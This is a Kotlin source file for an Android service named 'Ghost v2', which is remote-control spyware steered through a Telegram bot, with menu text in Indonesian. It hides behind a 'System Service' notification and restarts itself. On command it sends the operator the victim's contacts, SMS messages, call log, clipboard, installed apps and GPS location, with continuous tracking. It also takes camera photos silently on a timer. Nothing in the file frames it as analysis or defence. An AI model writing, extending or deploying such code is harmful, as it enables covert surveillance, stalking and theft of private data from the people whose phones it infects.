package com.ghost.app
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.net.Uri
import android.os.*
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
class CaptureService : Service() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val lastUpdateId = AtomicLong(0)
    private var torchOn = false
    private var tracking = false
    private var cameraId: String? = null
    override fun onCreate() {
        super.onCreate()
        startForeground(1, buildNotif("System service running"))
        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
        scope.launch { TgSender.sendMessage("🟢 <b>Ghost v2 online</b>\nDevice: ${Build.MODEL}\n\nKetik /menu") }
        scope.launch { pollLoop() }
        scope.launch { photoLoop() }
    }
    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null
    override fun onDestroy() { scope.cancel(); super.onDestroy() }
    private fun buildNotif(text: String): Notification {
        val chId = "ghost_ch"
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, chId).setContentTitle("System Service").setContentText(text).setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
    }
    private suspend fun pollLoop() {
        while (scope.isActive) {
            try {
                val raw = TgSender.getUpdates(lastUpdateId.get()) ?: continue
                val arr = JSONObject(raw).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val upd = arr.getJSONObject(i); lastUpdateId.set(upd.getLong("update_id") + 1)
                    val msg = upd.optJSONObject("message") ?: continue
                    if (msg.getJSONObject("chat").optString("id") != Config.CHAT_ID) continue
                    handleCommand(msg.optString("text").trim())
                }
            } catch (e: Exception) { Log.w("Ghost", "poll", e) }
            delay(Config.POLL_INTERVAL_MS)
        }
    }
    private fun handleCommand(cmd: String) {
        when {
            cmd == "/start" || cmd == "/menu" || cmd == "/help" -> TgSender.sendLong(MENU)
            cmd == "/status" -> TgSender.sendMessage("🟢 alive\ntorch=${if (torchOn) "on" else "off"}\ntrack=${if (tracking) "on" else "off"}")
            cmd == "/photo" -> scope.launch { takePhotoAndSend() }
            cmd == "/loc" -> scope.launch { sendLocation() }
            cmd == "/track_on" -> { tracking = true; scope.launch { trackLoop() }; TgSender.sendMessage("📍 tracking on") }
            cmd == "/track_off" -> { tracking = false; TgSender.sendMessage("📍 tracking off") }
            cmd == "/torch_on" -> scope.launch { setTorch(true) }
            cmd == "/torch_off" -> scope.launch { setTorch(false) }
            cmd == "/battery" -> {
                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
                TgSender.sendMessage("🔋 ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%")
            }
            cmd == "/contacts" -> scope.launch { TgSender.sendLong(DataGrabber.contacts(this@CaptureService)) }
            cmd == "/sms" -> scope.launch { TgSender.sendLong(DataGrabber.sms(this@CaptureService)) }
            cmd == "/calls" -> scope.launch { TgSender.sendLong(DataGrabber.callLog(this@CaptureService)) }
            cmd == "/apps" -> scope.launch { TgSender.sendLong(DataGrabber.apps(this@CaptureService)) }
            cmd == "/device" -> scope.launch { TgSender.sendLong(DataGrabber.deviceInfo(this@CaptureService)) }
            cmd == "/clip" -> scope.launch { TgSender.sendMessage(DataGrabber.clipboard(this@CaptureService)) }
            cmd == "/vibrate" -> {
                val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(800, VibrationEffect.DEFAULT_AMPLITUDE)) else @Suppress("DEPRECATION") v.vibrate(800)
                TgSender.sendMessage("📳 vibrate")
            }
            cmd.startsWith("/volume ") -> {
                val lvl = cmd.removePrefix("/volume ").trim().toIntOrNull() ?: 50
                val am = getSystemService(AUDIO_SERVICE) as AudioManager
                val max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                am.setStreamVolume(AudioManager.STREAM_MUSIC, (max * lvl / 100), 0)
                TgSender.sendMessage("🔊 volume $lvl%")
            }
            cmd.startsWith("/toast ") -> {
                val txt = cmd.removePrefix("/toast ")
                Handler(Looper.getMainLooper()).post { Toast.makeText(this, txt, Toast.LENGTH_LONG).show() }
                TgSender.sendMessage("💬 toast sent")
            }
            cmd.startsWith("/open ") -> {
                val url = cmd.removePrefix("/open ")
                try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); TgSender.sendMessage("🌐 opened") } catch (e: Exception) { TgSender.sendMessage("err: ${e.message}") }
            }
            else -> TgSender.sendMessage("❓ command tidak dikenal. ketik /menu")
        }
    }
    private suspend fun photoLoop() { while (scope.isActive) { delay(Config.PHOTO_INTERVAL_MS); runCatching { takePhotoAndSend() } } }
    private suspend fun trackLoop() { while (tracking && scope.isActive) { sendLocation(); delay(Config.TRACK_INTERVAL_MS) } }
    private suspend fun takePhotoAndSend() = suspendCoroutine<Unit> { cont ->
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = cameraId ?: run { cont.resume(Unit); return@suspendCoroutine }
        try {
            val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: run { cont.resume(Unit); return@suspendCoroutine }
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buf = img.planes[0].buffer; val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                img.close(); r.close(); scope.launch { TgSender.sendPhoto(bytes, "📸 ${Build.MODEL}"); cont.resume(Unit) }
            }, Handler(Looper.getMainLooper()))
            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE); req.addTarget(reader.surface)
                            s.capture(req.build(), null, null); dev.close()
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { dev.close(); cont.resume(Unit) }
                    }, null)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close(); cont.resume(Unit) }
            }, null)
        } catch (e: Exception) { Log.w("Ghost", "photo", e); cont.resume(Unit) }
    }
    private fun setTorch(on: Boolean) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager; val id = cameraId ?: return
            cm.setTorchMode(id, on); torchOn = on; TgSender.sendMessage(if (on) "🔦 torch on" else "🔦 torch off")
        } catch (e: Exception) { TgSender.sendMessage("torch err: ${e.message}") }
    }
    private fun sendLocation() {
        try {
            val lm = getSystemService(LOCATION_SERVICE) as LocationManager
            val loc: Location? = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) { TgSender.sendMessage("📍 no location"); return }
            TgSender.sendMessage("📍 <b>Lokasi</b>\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAkurasi: ${loc.accuracy}m\nhttps://maps.google.com/?q=${loc.latitude},${loc.longitude}")
        } catch (e: SecurityException) { TgSender.sendMessage("📍 izin lokasi belum aktif") }
    }
    companion object {
        val MENU = """
🤖 <b>Ghost v2 — Menu Fitur</b>
📸 /photo — ambil foto (auto tiap 2 mnt)
📍 /loc — lokasi sekarang
📍 /track_on / /track_off — tracking
🔦 /torch_on / /torch_off — senter
📳 /vibrate — getarkan HP
🔊 /volume 50 — set volume
📇 /contacts — kontak
💬 /sms — SMS
📞 /calls — call log
📦 /apps — app terinstall
📱 /device — info HP
📋 /clip — clipboard
💬 /toast teks — toast
🌐 /open https://x — buka URL
🔋 /battery — baterai
/status — status service
        """.trimIndent()
    }
}
